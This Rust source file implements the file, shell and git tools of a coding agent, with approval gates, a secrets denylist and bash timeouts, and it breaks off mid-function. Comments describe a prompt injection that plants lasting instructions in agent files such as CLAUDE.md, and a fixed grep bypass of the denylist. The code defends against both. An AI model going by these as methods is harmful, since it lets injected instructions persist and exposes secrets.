//! Ferramentas locais (docs/ferramentas.md). Registry: nome → schema JSON
//! (enviado ao modelo) + executor. Leitura (C1) + escrita/exec/git (C2). Tudo
//! confinado à raiz do projeto (guard) e respeitando `.gitignore` (ignore).
//! Gate por ferramenta via `Frontend`: leitura/git-read = `Auto`;
//! edit/write/git_commit = `Confirm` (monta o `Preview` — diff/comando — e o
//! frontend mostra + pergunta); bash = classificado. Nada escreve/roda sem
//! aprovação. As ferramentas NÃO imprimem nada direto (quem renderiza é o
//! frontend — CLI ANSI ou JSON) → o mesmo executor serve terminal e host.
//!
//! (Um único arquivo no C1/C2; split em `tools/{fs,edit,shell,git}.rs` é cleanup
//! futuro — ver docs/arquitetura-cli.md.)

use crate::frontend::Frontend;
use crate::gate::{Policy, Preview};
use crate::guard;
use crate::types::{ToolCall, ToolDef};
use globset::Glob;
use ignore::WalkBuilder;
use serde_json::json;
use std::collections::HashMap;
use std::hash::{Hash, Hasher};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

const MAX_BYTES: usize = 64 * 1024;
const MAX_HITS: usize = 200;
const MAX_OUTPUT: usize = 32 * 1024;

/// Teto de tempo do `bash`, em segundos. `0` desliga o teto.
///
/// ## Por que existe (achado F-04 da revisão de 01/09/2026)
///
/// A doc prometia timeout em dois lugares (`docs/ferramentas.md`, `docs/arquitetura-cli.md`)
/// e o código chamava `output()`, que **espera para sempre**. Um `tail -f`, um `sleep`, um
/// `npm run dev` ou um `cargo test` que trava congelam o turno inteiro.
///
/// No REPL o dev vê e faz Ctrl-C. No host NDJSON — a casca do SHVIA-DESKTOP — a sessão
/// simplesmente **emudece**, e o único remédio é matar o sidecar, o que perde a sessão. Era
/// esse o custo real: não "o comando demora", e sim "a única saída perde o trabalho".
pub(crate) const TIMEOUT_BASH_PADRAO_S: u64 = 120;
static TIMEOUT_BASH_S: OnceLock<u64> = OnceLock::new();

/// Define o teto do `bash` a partir da config. Chamado uma vez, no arranque.
///
/// Mesmo padrão do `memory::init`: a config não desce por parâmetro até aqui porque
/// `tools::run` é chamado de três lugares (runner local, host NDJSON, orquestrador) e
/// enfiar um campo novo na assinatura dos três para carregar um número seria pior.
pub fn configurar_timeout_bash(segundos: u64) {
    let _ = TIMEOUT_BASH_S.set(segundos);
}

fn timeout_bash() -> Option<Duration> {
    match *TIMEOUT_BASH_S.get_or_init(|| TIMEOUT_BASH_PADRAO_S) {
        0 => None,
        s => Some(Duration::from_secs(s)),
    }
}

/// Defs enviadas ao modelo (`tools[]` do protocolo).
pub fn defs() -> Vec<ToolDef> {
    let def = |name: &str, description: &str, props: serde_json::Value, req: serde_json::Value| ToolDef {
        name: name.into(),
        description: description.into(),
        parameters: json!({ "type": "object", "properties": props, "required": req }),
    };
    vec![
        def("read_file", "Lê um arquivo de texto do projeto.",
            json!({
                "path": {"type":"string","description":"Caminho relativo à raiz do projeto."},
                "max_bytes": {"type":"integer","description":"Teto opcional (default 65536)."}
            }), json!(["path"])),
        def("list_dir", "Lista arquivos e pastas de um diretório (respeita .gitignore).",
            json!({"path": {"type":"string","description":"Relativo à raiz ('.' = raiz)."}}), json!(["path"])),
        def("grep", "Busca um regex nos arquivos do projeto.",
            json!({
                "pattern": {"type":"string","description":"Regex (sintaxe Rust)."},
                "path": {"type":"string","description":"Subárvore (default: raiz)."},
                "glob": {"type":"string","description":"Filtro de arquivo, ex.: '*.rs'."}
            }), json!(["pattern"])),
        def("glob", "Lista arquivos por padrão glob (ex.: src/**/*.rs).",
            json!({"pattern": {"type":"string"}}), json!(["pattern"])),
        def("edit_file", "Edita um arquivo por substituição exata de trecho (mostra diff, pede confirmação).",
            json!({
                "path": {"type":"string"},
                "old_string": {"type":"string","description":"Trecho EXATO a substituir (único, salvo replace_all)."},
                "new_string": {"type":"string"},
                "replace_all": {"type":"boolean","description":"Substituir todas as ocorrências (default false)."}
            }), json!(["path","old_string","new_string"])),
        def("write_file", "Cria ou sobrescreve um arquivo (mostra diff, pede confirmação).",
            json!({"path": {"type":"string"}, "content": {"type":"string"}}), json!(["path","content"])),
        def("bash", "Roda um comando no diretório do projeto (allowlist roda direto; destrutivo confirma sempre).",
            json!({
                "command": {"type":"string"},
                "why": {"type":"string","description":"1 linha: por que este comando."}
            }), json!(["command"])),
        def("git_status", "git status (branch + arquivos alterados).", json!({}), json!([])),
        def("git_diff", "git diff das mudanças (staged com staged=true).",
            json!({"staged": {"type":"boolean"}}), json!([])),
        def("git_commit", "Commita as mudanças (mostra o diff staged, pede confirmação).",
            json!({
                "message": {"type":"string","description":"Mensagem do commit."},
                "add_all": {"type":"boolean","description":"git add -A antes (default false)."}
            }), json!(["message"])),
        // The task list the dev sees in the Tasks tab of ShvIA's Code mode (0.13.0). Same shape as
        // Claude Code's TodoWrite on purpose: the screen reads both with one parser. It writes
        // nothing on disk, so it is also offered in the read-only (plan) runner.
        def("todo_write", "Mantém a lista de tarefas deste trabalho (a lista INTEIRA a cada chamada). Use em trabalho com 3+ etapas; uma tarefa in_progress por vez; marque completed assim que terminar.",
            json!({
                "todos": {"type":"array","description":"A lista completa, na ordem.","items": {
                    "type":"object",
                    "properties": {
                        "content": {"type":"string","description":"A tarefa, no imperativo (ex.: 'Corrigir a query')."},
                        "status": {"type":"string","enum":["pending","in_progress","completed"]},
                        "activeForm": {"type":"string","description":"Como aparece enquanto está em andamento (ex.: 'Corrigindo a query')."}
                    },
                    "required": ["content","status"]
                }}
            }), json!(["todos"])),
    ]
}

/// Tasks a single `todo_write` accepts. A list longer than this is a plan, not a checklist.
const MAX_TAREFAS: usize = 50;

/// `todo_write`: validates the list and answers with a one-line summary. The LIST itself reaches
/// the screen through the `tool_call` event the stream already emits for every call; this answer
/// is what the model reads back, so it says what it has to do next when something is off.
fn todo_write(args: &serde_json::Value) -> String {
    let Some(itens) = args.get("todos").and_then(|v| v.as_array()) else {
        return "ERRO: `todos` tem de ser a lista inteira de tarefas.".into();
    };
    if itens.len() > MAX_TAREFAS {
        return format!("ERRO: {} tarefas é demais para uma lista; agrupe em no máximo {MAX_TAREFAS}.", itens.len());
    }
    let (mut feitas, mut em_andamento) = (0usize, Vec::new());
    for (i, t) in itens.iter().enumerate() {
        let content = t.get("content").and_then(|v| v.as_str()).unwrap_or("").trim();
        if content.is_empty() {
            return format!("ERRO: a tarefa {} está sem `content`.", i + 1);
        }
        match t.get("status").and_then(|v| v.as_str()).unwrap_or("") {
            "completed" => feitas += 1,
            "in_progress" => em_andamento.push(content.to_string()),
            "pending" => {}
            outro => return format!("ERRO: status '{outro}' na tarefa {}; use pending, in_progress ou completed.", i + 1),
        }
    }
    let mut out = format!("Lista de tarefas atualizada: {feitas} de {} concluídas.", itens.len());
    match em_andamento.len() {
        0 => {}
        1 => out.push_str(&format!(" Em andamento: {}.", em_andamento[0])),
        n => out.push_str(&format!(" Atenção: {n} tarefas marcadas in_progress; mantenha uma por vez.")),
    }
    out
}

/// Ferramentas do modo host (`--tools host`): só o shell. O `anna` PROPÕE um
/// comando e a casca externa (ex.: SShvTerm) executa no host dela, com a
/// política/PTY/auditoria própria — mapeia 1:1 no `propose_command` do SShvTerm.
pub fn defs_host() -> Vec<ToolDef> {
    defs().into_iter().filter(|d| d.name == "bash").collect()
}

/// Executa um tool call localmente e devolve o `content` da mensagem role=tool.
/// O `fe` (frontend) decide as aprovações e renderiza os previews.
pub fn run(call: &ToolCall, root: &Path, fe: &mut dyn Frontend) -> String {
    let a = &call.arguments;
    let s = |k: &str| a.get(k).and_then(|v| v.as_str()).unwrap_or_default().to_string();
    let b = |k: &str| a.get(k).and_then(|v| v.as_bool()).unwrap_or(false);
    match call.name.as_str() {
        "read_file" => {
            let bytes = a.get("max_bytes").and_then(|v| v.as_u64()).map(|n| n as usize).unwrap_or(MAX_BYTES);
            read_file(root, &s("path"), bytes)
        }
        "list_dir" => list_dir(root, &s("path")),
        "grep" => grep(root, &s("pattern"), &s("path"), &s("glob")),
        "glob" => glob_files(root, &s("pattern")),
        "edit_file" => edit_file(root, &s("path"), &s("old_string"), &s("new_string"), b("replace_all"), &call.id, fe),
        "write_file" => write_file(root, &s("path"), &s("content"), &call.id, fe),
        "bash" => bash(root, &s("command"), &s("why"), &call.id, fe),
        "git_status" => run_git(root, &["status", "--short", "--branch"]),
        "git_diff" => {
            let mut args = vec!["diff"];
            if b("staged") { args.push("--staged"); }
            run_git(root, &args)
        }
        "git_commit" => git_commit(root, &s("message"), b("add_all"), &call.id, fe),
        "todo_write" => todo_write(a),
        other => format!("ERRO: ferramenta desconhecida '{other}'."),
    }
}

fn rel_of(root: &Path, p: &Path) -> String {
    p.strip_prefix(root).unwrap_or(p).to_string_lossy().replace('\\', "/")
}

/// The path the approval card names: the one asked for, plus the real file when it is a symlink
/// (`notes.md → docs/notes-v2.md`). The person approves a file, not a name.
fn mostrado(root: &Path, path: &str, full: &Path) -> String {
    match guard::link_target(root, path, full) {
        Some(real) => format!("{path} → {real}"),
        None => path.to_string(),
    }
}

// ── Leitura (C1) ────────────────────────────────────────────────────────────

// ── What the model has seen of each file (0.15.7) ───────────────────────────
//
// A whole-file write replaces the file with what the model believes is in it. When that belief is
// a read from three rounds ago, or a guess from a grep, the write throws away whatever changed in
// between: the person's own edit, a formatter, another tool. The diff on the approval card shows
// the loss, but in a long diff it is easy to miss, and with "t" granted for `write_file` nobody
// looks. Hermes refuses such a write until the file is read again (`file_tools_write_guards.py`,
// comparison of 02/11/2026). `edit_file` needs no guard: its exact `old_string` must match the
// file as it is now.

/// The content mark of each file as the model last saw it whole: read in full, or written by it.
static VISTOS: Mutex<Option<HashMap<PathBuf, u64>>> = Mutex::new(None);

fn marca(bytes: &[u8]) -> u64 {
    let mut h = std::collections::hash_map::DefaultHasher::new();
    bytes.hash(&mut h);
    h.finish()
}

fn com_vistos<T>(f: impl FnOnce(&mut HashMap<PathBuf, u64>) -> T) -> T {
    let mut guarda = VISTOS.lock().unwrap_or_else(|e| e.into_inner());
    f(guarda.get_or_insert_with(HashMap::new))
}

/// Why overwriting `full` (now holding `atual`) is refused, or `None` when the model has seen it
/// as it is.
fn escrita_sobre_leitura_velha(full: &Path, path: &str, atual: &[u8]) -> Option<String> {
    match com_vistos(|v| v.get(full).copied()) {
        None => Some(format!(
            "RECUSADO: '{path}' já existe e não foi lido inteiro nesta sessão — sobrescrever agora apagaria o que \
             você não viu. Leia o arquivo inteiro (read_file; max_bytes ≥ {} se precisar) e reescreva a partir dele, \
             ou troque só o trecho com edit_file.",
            atual.len()
        )),
        Some(m) if m != marca(atual) => Some(format!(
            "RECUSADO: '{path}' mudou desde a sua última leitura (uma edição do dev, um comando ou outra ferramenta) — \
             sobrescrever agora desfaria essa mudança. Releia e mescle, ou use edit_file."
        )),
        _ => None,
    }
}

fn read_file(root: &Path, path: &str, max_bytes: usize) -> String {
    if guard::denied(path) {
        return format!("RECUSADO: '{path}' está na denylist de segredos (SECURITY §2.3).");
    }
    let Some(full) = guard::resolve(root, path) else {
        return format!("ERRO: '{path}' inexistente ou fora do projeto.");
    };
    if guard::denied_target(root, &full) {
        return format!("RECUSADO: '{path}' aponta para um arquivo da denylist de segredos (SECURITY §2.3).");
    }
    if !full.is_file() {
        return format!("ERRO: '{path}' não é um arquivo.");
    }
    match std::fs::read(&full) {
        Ok(bytes) => {
            let total = bytes.len();
            if total <= max_bytes {
                com_vistos(|v| v.insert(full.clone(), marca(&bytes)));
            }
            let slice = if total > max_bytes { &bytes[..max_bytes] } else { &bytes[..] };
            let mut out = String::from_utf8_lossy(slice).into_owned();
            if total > max_bytes {
                out.push_str(&format!("\n… [truncado: {total} bytes no total, mostrando {max_bytes}]"));
            }
            out
        }
        Err(e) => format!("ERRO: falha ao ler '{path}': {e}"),
    }
}

fn list_dir(root: &Path, path: &str) -> String {
    let Some(dir) = guard::resolve(root, path) else {
        return format!("ERRO: '{path}' inexistente ou fora do projeto.");
    };
    if !dir.is_dir() {
        return format!("ERRO: '{path}' não é um diretório.");
    }
    let mut entries: Vec<String> = WalkBuilder::new(&dir)
        .max_depth(Some(1))
        .hidden(false)
        .build()
        .filter_map(Result::ok)
        .filter(|e| e.depth() == 1)
        .map(|e| {
            let name = e.file_name().to_string_lossy().into_owned();
            if e.file_type().map(|t| t.is_dir()).unwrap_or(false) { format!("{name}/") } else { name }
        })
        .collect();
    entries.sort();
    if entries.is_empty() { "(vazio)".into() } else { entries.join("\n") }
}

fn grep(root: &Path, pattern: &str, path: &str, glob: &str) -> String {
    let re = match regex::Regex::new(pattern) {
        Ok(r) => r,
        Err(e) => return format!("ERRO: regex inválido: {e}"),
    };
    let matcher = if glob.is_empty() {
        None
    } else {
        match Glob::new(glob) {
            Ok(g) => Some(g.compile_matcher()),
            Err(e) => return format!("ERRO: glob inválido: {e}"),
        }
    };
    // The denylist applies to grep as it does to read_file (SECURITY_GUIDELINES §2.3 says so for
    // both). Until 27/10/2026 it did not: `grep SECRET` returned the lines of a non-ignored
    // `certs/server.pem`, and an explicit `path=".env"` bypassed both the hidden-file filter and
    // .gitignore (external review, 26/10/2026). Each file is checked by its real path; the walk
    // does not follow symlinks, and an explicit path is resolved through them.
    if !path.is_empty() && guard::denied(path) {
        return format!("RECUSADO: '{path}' está na denylist de segredos (SECURITY §2.3).");
    }
    let base = if path.is_empty() {
        root.to_path_buf()
    } else {
        match guard::resolve(root, path) {
            Some(p) => p,
            None => return format!("ERRO: '{path}' inexistente ou fora do projeto."),
        }
    };
    let root_c = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
    let mut hits: Vec<String> = Vec::new();
    let mut recusados = 0usize;
    'walk: for entry in WalkBuilder::new(&base).build().filter_map(Result::ok) {
        if !entry.file_type().map(|t| t.is_file()).unwrap_or(false) {
            continue;
        }
        let p = entry.path();
        if let Some(m) = &matcher {
            if !m.is_match(p.file_name().unwrap_or_default()) {
                continue;
            }
        }
        let rel = if p.starts_with(&root_c) { rel_of(&root_c, p) } else { rel_of(root, p) };
        if guard::denied(&rel) {
            recusados += 1;
            continue;
        }
        let Ok(content) = std::fs::read_to_string(p) else { continue };
        for (i, line) in content.lines().enumerate() {
            if re.is_match(line) {
                hits.push(format!("{rel}:{}: {}", i + 1, line.trim()));
                if hits.len() >= MAX_HITS {
                    hits.push(format!("… [cortado em {MAX_HITS} resultados]"));
                    break 'walk;
                }
            }
        }
    }
    if recusados > 0 {
        hits.push(format!("… [{recusados} arquivo(s) da denylist de segredos não foram lidos]"));
    }
    if hits.is_empty() { "(nenhum resultado)".into() } else { hits.join("\n") }
}

fn glob_files(root: &Path, pattern: &str) -> String {
    let matcher = match Glob::new(pattern) {
        Ok(g) => g.compile_matcher(),
        Err(e) => return format!("ERRO: glob inválido: {e}"),
    };
    let mut found: Vec<String> = Vec::new();
    for entry in WalkBuilder::new(root).build().filter_map(Result::ok) {
        if found.len() >= MAX_HITS {
            break;
        }
        if !entry.file_type().map(|t| t.is_file()).unwrap_or(false) {
            continue;
        }
        let rel = rel_of(root, entry.path());
        if matcher.is_match(rel.as_str()) {
            found.push(rel);
        }
    }
    found.sort();
    if found.is_empty() { "(nenhum arquivo)".into() } else { found.join("\n") }
}

// ── Escrita (C2) — Preview + aprovação via frontend ─────────────────────────

/// The files the fleet's agents load as their own instructions: anna's context block, Claude
/// Code and Codex read them at the start of every session.
pub fn eh_arquivo_de_instrucao(path: &Path) -> bool {
    path.file_name()
        .and_then(|n| n.to_str())
        .is_some_and(|n| matches!(n.to_ascii_lowercase().as_str(), "anna.md" | "agents.md" | "claude.md" | "claude.local.md"))
}

/// A write to an instruction file always asks, even with "t/Sempre" granted for the tool
/// (0.15.4). What goes in there is loaded into every later session of every agent, so a prompt
/// injected in one turn, riding a session-wide approval, would plant an instruction that outlives
/// the session. Hermes requires a person for these writes in every mode (comparison of
/// 02/11/2026). The requested name and the real target both count: a link named `CLAUDE.md`
/// writes what CLAUDE.md shows.
fn politica_de_escrita(pedido: &str, real: &Path) -> Policy {
    if eh_arquivo_de_instrucao(Path::new(pedido)) || eh_arquivo_de_instrucao(real) {
        Policy::Always
    } else {
        Policy::Confirm
    }
}

fn edit_file(root: &Path, path: &str, old: &str, new: &str, replace_all: bool, id: &str, fe: &mut dyn Frontend) -> String {
    if guard::denied(path) {
        return format!("RECUSADO: '{path}' está na denylist de segredos (SECURITY §2.3).");
    }
    // old_string vazio casa em toda fronteira de char (matches("") = len+1): com
    // replace_all destruiria o arquivo (insere new entre cada char); sem, faria um
    // prepend silencioso. Para criar/inserir, a ferramenta certa é write_file.
    if old.is_empty() {
        return "ERRO: old_string vazio não é permitido — use write_file para criar ou gerar o conteúdo.".into();
    }
    let Some(full) = guard::resolve(root, path) else {
        return format!("ERRO: '{path}' inexistente ou fora do projeto.");
    };
    if guard::denied_target(root, &full) {
        return format!("RECUSADO: '{path}' aponta para um arquivo da denylist de segredos (SECURITY §2.3).");
    }
    let Ok(content) = std::fs::read_to_string(&full) else {
        return format!("ERRO: não consegui ler '{path}' como texto.");
    };
    let count = content.matches(old).count();
    if count == 0 {
        return "ERRO: old_string não encontrado no arquivo (copie o trecho EXATO).".into();
    }
    if count > 1 && !replace_all {
        return format!("ERRO: old_string aparece {count}x — dê mais contexto pra ser único, ou use replace_all.");
    }
    let updated = if replace_all { content.replace(old, new) } else { content.replacen(old, new, 1) };
    let shown = mostrado(root, path, &full);
    let preview = Preview::Diff { path: &shown, old: content.as_str(), new: updated.as_str() };
    if !fe.approve(politica_de_escrita(path, &full), "edit_file", id, &preview) {
        return "RECUSADO: edição cancelada pelo usuário.".into();
    }
    crate::checkpoint::snapshot(root, &format!("edit_file {path}"));
    match std::fs::write(&full, &updated) {
        Ok(_) => {
            // A model that had seen the whole file still has: it knows the change it made.
            com_vistos(|v| {
                if v.get(&full) == Some(&marca(content.as_bytes())) {
                    v.insert(full.clone(), marca(updated.as_bytes()));
                }
            });
            format!("ok — {path} editado ({} ocorrência(s)).", if replace_all { count } else { 1 })
        }
        Err(e) => format!("ERRO: falha ao gravar '{path}': {e}"),
    }
}

fn write_file(root: &Path, path: &str, content: &str, id: &str, fe: &mut dyn Frontend) -> String {
    if guard::denied(path) {
        return format!("RECUSADO: '{path}' está na denylist de segredos (SECURITY §2.3).");
    }
    let Some(full) = guard::resolve_new(root, path) else {
        return format!("ERRO: '{path}' aponta para fora do projeto, ou a pasta-pai não existe.");
    };
    if guard::denied_target(root, &full) {
        return format!("RECUSADO: '{path}' aponta para um arquivo da denylist de segredos (SECURITY §2.3).");
    }
    let existed = full.exists();
    if existed {
        let atual = std::fs::read(&full).unwrap_or_default();
        if let Some(recusa) = escrita_sobre_leitura_velha(&full, path, &atual) {
            return recusa;
        }
    }
    let old = std::fs::read_to_string(&full).unwrap_or_default();
    // "Sem mudanças" só vale se o arquivo JÁ existe com esse conteúdo. Sem o
    // `existed`, criar um arquivo novo vazio (content=="") batia com o
    // unwrap_or_default() de um arquivo inexistente ("") e retornava "sem mudanças"
    // sem nunca gravar — o arquivo nunca era criado (erro silencioso).
    if existed && old == content {
        return format!("ok — '{path}' já tem esse conteúdo (sem mudanças).");
    }
    let shown = mostrado(root, path, &full);
    let preview = Preview::Diff { path: &shown, old: old.as_str(), new: content };
    if !fe.approve(politica_de_escrita(path, &full), "write_file", id, &preview) {
        return "RECUSADO: escrita cancelada pelo usuário.".into();
    }
    crate::checkpoint::snapshot(root, &format!("write_file {path}"));
    match std::fs::write(&full, content) {
        Ok(_) => {
            com_vistos(|v| v.insert(full.clone(), marca(content.as_bytes())));
            format!("ok — '{path}' {} ({} bytes).", if existed { "sobrescrito" } else { "criado" }, content.len())
        }
        Err(e) => format!("ERRO: falha ao gravar '{path}': {e}"),
    }
}

// ── Shell (C2) — classificação + captura ────────────────────────────────────

fn bash(root: &Path, command: &str, why: &str, id: &str, fe: &mut dyn Frontend) -> String {
    if command.trim().is_empty() {
        return "ERRO: comando vazio.".into();
    }
    let policy = classify(command);
    let preview = Preview::Command { command, why };
    if !fe.approve(policy, "bash", id, &preview) {
        return "RECUSADO: comando cancelado pelo usuário.".into();
    }
    // Comando destrutivo aprovado: foto antes — /rollback devolve os arquivos
    // RASTREADOS que ele apagar/alterar (o que estiver fora do git, não).
    if is_destructive(command) {
        crate::checkpoint::snapshot(root, &format!("bash destrutivo: {}", cap(command, 60)));
    }
    executar_bash(root, command, timeout_bash())
}

/// Roda o comando com teto de tempo, matando o GRUPO de processos se estourar.
///
/// ## Por que grupo, e não só o filho (achado F-04)
///
/// O filho é o `sh -c`. Quem trava é quase sempre o neto: o `node` do `npm run dev`, o
/// binário de teste do `cargo test`. Matar só o `sh` deixaria o neto vivo, segurando o pipe
/// — e a leitura da saída ficaria pendurada exatamente como antes, com a diferença de agora
/// mentir que houve timeout. `process_group(0)` põe todos no mesmo grupo e um sinal alcança
/// a árvore inteira.
///
/// ## Por que threads para ler a saída
///
/// O pipe do SO tem tamanho fixo (64 KB no Linux). Um comando que escreve mais que isso
/// **bloqueia na escrita** enquanto ninguém lê. Se esperássemos o processo terminar para só
/// então ler, um comando falante travaria — e o timeout "consertaria" matando um processo
/// que estava saudável. As duas threas drenam os pipes enquanto o comando corre.
fn executar_bash(root: &Path, command: &str, teto: Option<Duration>) -> String {
    let mut cmd = Command::new("sh");
    cmd.arg("-c")
        .arg(command)
        .current_dir(root)
        // `stdin` nulo: o `output()` já garantia isso, e mantê-lo é o que impede um
        // comando interativo de engolir o protocolo NDJSON do host.
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        cmd.process_group(0);
    }

    let mut filho = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => return format!("ERRO: falha ao executar: {e}"),
    };

    let saida = filho.stdout.take().map(ler_em_thread);
    let erro = filho.stderr.take().map(ler_em_thread);

    // Always polled, even with the ceiling off (`bash_timeout = 0`): a stop of the turn
    // (Ctrl-C, the host's `cancel`) must also end the command. The child runs in its own
    // process group, so the terminal's SIGINT never reaches it, and before 0.14.0 it kept
    // running after `anna` died.
    let arvore = Arvore::prender(&filho);
    let fim = esperar_ou_matar(&mut filho, teto, &arvore);
    let estourou = fim == Fim::Estourou;

    let code = filho.wait().ok().and_then(|st| st.code()).unwrap_or(-1);
    let mut s = saida.map(|h| h.join().unwrap_or_default()).unwrap_or_default();
    let err = erro.map(|h| h.join().unwrap_or_default()).unwrap_or_default();
    if !err.trim().is_empty() {
        s.push_str("\n[stderr]\n");
        s.push_str(&err);
    }
    if fim == Fim::Interrompido {
        return format!(
            "{}\nERRO: o usuário interrompeu o turno — o comando foi encerrado (grupo de processos morto).",
            cap(&s, MAX_OUTPUT)
        );
    }
    if estourou {
        // A mensagem é para o MODELO, e por isso diz o que fazer: sem o "rode em
        // background", ele tenta o mesmo comando de novo e gasta outro teto inteiro.
        let seg = teto.map(|t| t.as_secs()).unwrap_or(0);
        return format!(
            "{}\nERRO: timeout de {seg}s — o comando foi encerrado (grupo de processos morto).\n             Se ele é de longa duração (servidor, `tail -f`, watch), rode-o em background e \
             leia a saída depois, ou aumente `bash_timeout` no config.",
            cap(&s, MAX_OUTPUT)
        );
    }
    format!("{}\n[exit {code}]", cap(&s, MAX_OUTPUT))
}

/// Drena um pipe numa thread — ver o porquê no docblock de [`executar_bash`].
fn ler_em_thread<R: std::io::Read + Send + 'static>(mut r: R) -> std::thread::JoinHandle<String> {
    std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = std::io::Read::read_to_end(&mut r, &mut buf);
        String::from_utf8_lossy(&buf).into_owned()
    })
}

#[derive(PartialEq)]
enum Fim {
    Terminou,
    Estourou,
    Interrompido,
}

/// Espera o filho até o teto (se houver) ou até a interrupção do turno; nos dois casos mata a
/// árvore inteira.
fn esperar_ou_matar(filho: &mut Child, teto: Option<Duration>, arvore: &Arvore) -> Fim {
    let limite = teto.map(|t| Instant::now() + t);
    loop {
        match filho.try_wait() {
            Ok(Some(_)) => return Fim::Terminou,
            Ok(None) => {}
            Err(_) => return Fim::Terminou,
        }
        if limite.is_some_and(|l| Instant::now() >= l) {
            arvore.matar(filho);
            return Fim::Estourou;
        }
        if crate::interrupcao::pedido() {
            arvore.matar(filho);
            return Fim::Interrompido;
        }
        // 50 ms: o suficiente para não virar espera ocupada e curto o bastante para o
        // teto valer o que diz. Um comando que termina não espera mais que isso.
        std::thread::sleep(Duration::from_millis(50));
    }
}

/// The process tree of one `bash` call, so the ceiling can kill all of it, not just the `sh`.
///
/// On unix the tree is the process group that `process_group(0)` created at spawn, and
/// killing it is `matar_grupo`. Nothing to hold.
#[cfg(not(windows))]
struct Arvore;

#[cfg(not(windows))]
impl Arvore {
    fn prender(_filho: &Child) -> Self {
        Arvore
    }

    fn matar(&self, filho: &mut Child) {
        matar_grupo(filho);
    }
}

/// On Windows the tree is a Job Object. Windows has no process group, and walking parent
/// PIDs (`taskkill /T`, 0.11.32) does not reach everything: the Windows CI measured
/// `o_neto_morre_junto_com_o_pai` still hanging with it. Under Git for Windows' `sh`, a
/// grandchild whose parent already exited has no parent link left to walk, while job
/// membership is inherited at process creation and survives that.
///
/// No KILL_ON_JOB_CLOSE: a command that ends normally keeps whatever it started in the
/// background, as before. Only the ceiling terminates the job. A child that spawns before
/// `AssignProcessToJobObject` runs escapes the job; the window is the time between
/// `spawn()` returning and the next line, and `taskkill` stays as the fallback.
#[cfg(windows)]
struct Arvore(Option<windows_sys::Win32::Foundation::HANDLE>);

#[cfg(windows)]
impl Arvore {
    fn prender(filho: &Child) -> Self {
        use std::os::windows::io::AsRawHandle;
        use windows_sys::Win32::Foundation::CloseHandle;
        use windows_sys::Win32::System::JobObjects::{AssignProcessToJobObject, CreateJobObjectW};
        // SAFETY: plain Win32 calls with null attributes and name; the process handle
        // belongs to `filho`, which outlives this call; on failure the job handle is closed.
        unsafe {
            let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
            if job.is_null() {
                return Arvore(None);
            }
            if AssignProcessToJobObject(job, filho.as_raw_handle() as _) == 0 {
                CloseHandle(job);
                return Arvore(None);
            }
            Arvore(Some(job))
        }
    }

    fn matar(&self, filho: &mut Child) {
        match self.0 {
            // SAFETY: `job` is a live handle owned by this struct until Drop.
            Some(job) => unsafe {
                windows_sys::Win32::System::JobObjects::TerminateJobObject(job, 1);
            },
            None => matar_grupo(filho),
        }
        let _ = filho.kill();
    }
}

#[cfg(windows)]
impl Drop for Arvore {
    fn drop(&mut self) {
        if let Some(job) = self.0 {
            // SAFETY: closes the handle this struct owns, exactly once.
            unsafe {
                windows_sys::Win32::Foundation::CloseHandle(job);
            }
        }
    }
}

#[cfg(unix)]
fn matar_grupo(filho: &mut Child) {
    // `kill -KILL -- -<pgid>` reaches the whole tree. It uses the `kill` binary instead of
    // `libc` so one call does not add a dependency; the house already runs `git` and `sh`
    // through `Command`, and this path only runs when something already went wrong.
    //
    // 🔴 The `--` is load-bearing. Without it, procps-ng's `kill` does not read `-<pgid>` as
    // a PID: `kill -KILL -999999` exits 0 without a word, while `kill -KILL -- -999999`
    // says "No such process". On GitHub's ubuntu-latest runner the group survived and
    // `comando_que_trava_e_morto_no_teto` took the full 30 s (0.11.28).
    let pgid = filho.id();
    let _ = Command::new("kill")
        .arg("-KILL")
        .arg("--")
        .arg(format!("-{pgid}"))
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();
    // Cinto e suspensório: se o grupo não existir mais (ou o `kill` faltar), o filho
    // ainda morre. Sem isto, um `kill` ausente no PATH deixaria o processo vivo.
    let _ = filho.kill();
}

#[cfg(not(unix))]
fn matar_grupo(filho: &mut Child) {
    // Windows has no process group to signal, and `filho.kill()` alone ends only the
    // `sh`: the grandchild (`sleep`, `node`, the test binary) kept the output pipe open
    // and the read hung until it exited, which is the hang the ceiling exists to stop.
    // The Windows CI measured it once 0.11.27 stopped hiding test failures.
    // `taskkill /T` walks the tree by parent PID; `/F` because a hung process will not
    // answer a polite close.
    let _ = Command::new("taskkill")
        .args(["/T", "/F", "/PID", &filho.id().to_string()])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();
    // Belt and braces, as on unix: if taskkill is missing or the tree is already gone,
    // the child still dies.
    let _ = filho.kill();
}

/// Política do comando: destrutivo (Always) > allowlist simples (Auto) > Confirm.
fn classify(cmd: &str) -> Policy {
    if is_destructive(cmd) {
        Policy::Always
    } else if is_simple_allowlisted(cmd) {
        Policy::Auto
    } else {
        Policy::Confirm
    }
}

/// Separa a linha em SEGMENTOS de comando por `;`, `|`, `||`, `&&` e nova linha,
/// respeitando aspas — para o `is_destructive` classificar cada comando por si.
///
/// Diferente do [`dividir_por_and`], que recusa (`None`) qualquer coisa fora de `&&`.
/// Aquele decide se tudo é leitura, e ali recusar é o lado seguro. Aqui a pergunta é
/// "algum destes comandos é perigoso?", e recusar significaria **não olhar** — então
/// este divide o que der e devolve os pedaços. Redireção (`>`) não separa comando:
/// ela e o alvo ficam no mesmo segmento, e é assim que tem de ser.
fn segmentos_de_comando(cmd: &str) -> Vec<String> {
    let mut segs = Vec::new();
    let mut atual = String::new();
    let mut aspa: Option<char> = None;
    let mut it = cmd.chars().peekable();
    while let Some(ch) = it.next() {
        match aspa {
            Some(a) => {
                if ch == a {
                    aspa = None;
                }
                atual.push(ch);
            }
            None => match ch {
                '\'' | '"' => {
                    aspa = Some(ch);
                    atual.push(ch);
                }
                ';' | '\n' | '|' | '&' => {
                    // `||` e `&&` são dois caracteres; consome o par sem gerar segmento vazio.
                    if it.peek() == Some(&ch) {
                        it.next();
                    }
                    segs.push(std::mem::take(&mut atual));
                }
                // Substituição de comando: o miolo é comando de verdade e vai ser
